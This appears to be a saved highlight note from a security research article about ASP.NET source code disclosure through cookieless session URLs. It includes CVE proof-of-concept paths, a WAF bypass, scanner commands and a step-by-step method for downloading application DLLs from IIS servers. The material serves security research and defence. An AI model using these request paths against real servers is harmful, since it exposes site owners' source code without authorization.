---
author: Arseniy Sharoglazov
aliases: [Source Code Disclosure in ASP.NET Apps]
tags: [readwise/articles, dotnet, cookieless-session]
url: https://swarm.ptsecurity.com/source-code-disclosure-in-asp-net-apps/?__readwiseLocation=
date: 2024-08-22
---
# Source Code Disclosure in ASP.NET Apps

![rw-book-cover](https://swarm.ptsecurity.com/wp-content/uploads/2024/02/8fdda128-preview-2.png)

## Environment

It looked like my application was written in C# on the [dotNET](../../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/dotNET.md) platform, was functioning under IIS, and was protected by a WAF based on nginx.

Knowing this was enough to bypass the 403 error:
![](https://swarm.ptsecurity.com/wp-content/uploads/2024/03/8cae72a2-403-bypass.png)
*The content of the “/login.aspx” page after bypassing the WAF (via a cookieless session)*

## Cookieless Sessions in ASP.NET

When you enable the ASP.NET feature in IIS, any page of the server starts accepting cookieless sessions. Here are different formats of these *cookieless sessions*:

| **.NET Version** | **URI**                    |
| ---------------- | -------------------------- |
| V1.0, V1.1       | /(XXXXXXXX)/               |
| V2.0+            | /(S(XXXXXXXX))/            |
| V2.0+            | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+            | …                          |
Source: [https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10)](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))

The ASP.NET cookieless sessions, along with PHP’s and Java’s analogs, have always been used for WAF bypass, session fixation, XSS, and all kinds of other attacks. [](https://read.readwise.io/read/01j5x540xtn7n0q4khdysj1bst)

Furthermore, Soroush Dalili (a.k.a. [@irsdl](https://twitter.com/irsdl)) recently discovered something new in this area: [Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc in ASP.NET Framework (CVE-2023-36899 & CVE-2023-36560)](https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/).

Here are the POCs from Soroush Dalili’s article:

| **CVE**        | **PoC**                                                                                      |
| -------------- | -------------------------------------------------------------------------------------------- |
| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  <br>/WebForm/(S(X))/b/(S(X))in/target2.aspx   |
| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/  <br>/WebForm/b/(S(X))in/target2.aspx/(S(X))/ |

### Investigation

After obtaining the RCE, I was able to access the target’s `web.config` file. Then, I reduced it to the minimum possible configuration:
```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true" />
  </system.webServer>
</configuration>
```

That was it. The `runAllManagedModulesForAllRequests` setting was the cause of our success.

### Scaling the POC

It quickly became clear that the technique works on other servers. The setting `runAllManagedModulesForAllRequests` isn’t rare and I was able to download a few DLLs from different websites the same day. [](https://read.readwise.io/read/01j5x57c3fnr67x82ecb9eh96r)

### Full Exploitation Algorithm

Here’s a brief guide on how to check the server on the vulnerability.

1. Check if cookieless sessions are allowed.
```
# If your application is in the main folder
/(S(X))/
/(Y(Z))/
/(G(AAA-BBB)D(CCC=DDD)E(0-1))/

# If your application is in a subfolder
/MyApp/(S(X))/
...
```

2. Optionally, use IIS-ShortName-Scanner. Note, its functionality doesn’t depend on whether cookieless sessions are enabled or not.
```bash
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
```

In addition to `/bin`, I recommend you to check other special .NET folders:
```
/App_Code
/App_WebReferences
/App_GlobalResources
/App_LocalResources
/App_Data
/App_Themes
/App_Browsers
/Themes
/Views
/Models
/Controllers
```

3. Try to read DLLs. It’s necessary to reconstruct complete filenames from shortened 8.3 format filenames.
```
http://Y.Y.Y.Y/(S(x))/b/(S(x))in/MyApplicationFile.dll
http://Y.Y.Y.Y/MyApp/(S(x))/b/(S(x))in/MyApplicationFile.dll
```

The PDB files, if such exists, will not be accessible. [](https://read.readwise.io/read/01j5x588xgg46w4wmrmc2k91fj)

